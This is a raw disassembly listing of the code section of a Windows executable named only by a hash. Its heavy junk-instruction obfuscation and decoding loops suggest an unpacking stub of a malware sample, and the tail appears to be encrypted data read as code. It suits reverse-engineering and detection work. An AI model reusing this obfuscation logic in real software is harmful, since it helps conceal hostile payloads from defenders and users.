
c23804f8d387bb37ddfd5fe7a6005c980d67071ffc7cc668ed5f517276fa5c01.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d1dc
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41ff3b
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ffb1
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ffd1
  401523:	push   0x41ff0b
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	sbb    eax,0x62334498
  401911:	bound  esp,QWORD PTR [edx+0x62]
  401914:	sbb    bl,BYTE PTR [edi+0x62]
  401917:	bound  ecx,QWORD PTR [ecx]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b2
  401922:	jbe    0x40199a
  401924:	dec    esi
  401925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401926:	jb     0x40199a
  401928:	jno    0x401954
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0x3a548ef1
  4019bd:	add    DWORD PTR [ebx+0x5cdd968],0x48
  4019c4:	xlat   BYTE PTR ds:[ebx]
  4019c5:	adc    DWORD PTR [ebx-0x7a],esi
  4019c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019c9:	icebp  
  4019ca:	iret   
  4019cb:	xchg   ebp,eax
  4019cc:	jmp    0x4b67:0x3a564934
  4019d3:	outs   dx,DWORD PTR ds:[esi]
  4019d4:	out    dx,eax
  4019d5:	cld    
  4019d6:	ret    
  4019d7:	into   
  4019d8:	cmp    eax,0x4c69ea38
  4019dd:	xchg   BYTE PTR [edi+0x3d4694a6],bl
  4019e3:	sbb    cl,BYTE PTR [edi-0x67]
  4019e6:	or     BYTE PTR [esp+edi*8],0x1
  4019ea:	mov    esp,0x2e731288
  4019ef:	loopne 0x401a2f
  4019f1:	gs add eax,0xf05429ad
  4019f7:	push   ds
  4019f8:	xchg   edx,eax
  4019f9:	jecxz  0x401a33
  4019fb:	retf   
  4019fc:	pusha  
  4019fd:	sub    al,0xad
  4019ff:	jns    0x4019c5
  401a01:	test   DWORD PTR [eax],0x3fe28db2
  401a07:	push   ecx
  401a08:	icebp  
  401a09:	fcomp  QWORD PTR [edi-0x7eda5b1a]
  401a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a10:	mov    eax,0xd3d5b655
  401a15:	mov    ch,BYTE PTR [eax+0x32]
  401a18:	push   ss
  401a19:	dec    BYTE PTR [ecx+0x4b42c931]
  401a1f:	fiadd  DWORD PTR [eax]
  401a21:	push   esi
  401a22:	retf   0xdf01
  401a25:	jge    0x401a8f
  401a27:	test   eax,0x4710ecbf
  401a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a2d:	cmp    BYTE PTR [esi-0x7884fda4],bh
  401a33:	xchg   ebx,eax
  401a34:	mov    edx,0x87e55231
  401a39:	in     al,0xd
  401a3b:	cs cmp dl,ch
  401a3e:	out    dx,al
  401a3f:	ror    DWORD PTR [eax-0x39a8c4f0],1
  401a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a46:	imul   edx,DWORD PTR [esi+ebp*4-0x61199f46],0xffffff89
  401a4e:	xchg   DWORD PTR [ecx+eax*4+0xddde009],edi
  401a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a56:	jl     0x4019df
  401a58:	or     ah,dh
  401a5a:	test   DWORD PTR [esi],eax
  401a5c:	test   al,0xd7
  401a5e:	push   ss
  401a5f:	rcl    DWORD PTR [esi+0x2b2987a2],0x26
  401a66:	loope  0x401a78
  401a68:	and    edx,DWORD PTR [edi+0x50af1b67]
  401a6e:	aas    
  401a6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a70:	xor    ecx,edx
  401a72:	dec    ecx
  401a73:	xor    al,0x23
  401a75:	mov    al,ds:0x38497193
  401a7a:	dec    ecx
  401a7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a7c:	jno    0x401ace
  401a7e:	sbb    BYTE PTR [edi+0x7d],0x7e
  401a82:	sub    ch,BYTE PTR [ecx-0x3a]
  401a85:	adc    eax,0xc5419140
  401a8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a8b:	sti    
  401a8c:	ja     0x401a89
  401a8e:	fdivr  QWORD PTR [eax-0x38]
  401a91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
